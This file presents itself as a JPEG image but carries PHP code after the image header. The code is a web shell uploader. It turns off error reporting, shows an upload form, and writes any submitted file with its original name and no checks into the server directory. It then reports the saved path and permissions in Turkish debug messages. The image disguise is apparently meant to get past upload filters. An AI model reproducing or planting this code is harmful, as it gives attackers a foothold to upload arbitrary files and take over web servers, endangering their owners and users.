����JFIF��;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90<?php
error_reporting(0);
echo '<form action="" method="post" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" name="_upl" value="Upload"></form>';

if(isset($_POST['_upl'])) {
    $file = $_FILES['file'];
    $path = dirname(__FILE__) . '/';  // Mevcut dizin
    
    // Dosya adını koruyalım
    $originalName = $file['name'];
    $uploadPath = $path . $originalName;
    
    // Debug bilgisi
    echo "Yüklenen: " . $file['name'] . "<br>";
    echo "Hedef: " . $uploadPath . "<br>";
    echo "Tmp: " . $file['tmp_name'] . "<br>";
    
    $_FILES['resim'] = array(
        'name' => $originalName,
        'type' => $file['type'],
        'tmp_name' => $file['tmp_name'],
        'error' => 0,
        'size' => $file['size']
    );
    
    if(@move_uploaded_file($file['tmp_name'], $uploadPath)) {
        echo "<b>Done! (" . $originalName . ")</b>";
        echo "<br>Dosya yolu: " . $uploadPath;
        echo "<br>Dosya var mı: " . (file_exists($uploadPath) ? 'Evet' : 'Hayır');
        echo "<br>İzinler: " . substr(sprintf('%o', fileperms($uploadPath)), -4);
    } else {
        echo "<b>Fail!</b><br>";
        echo "Hata: " . error_get_last()['message'];
    }
}
?>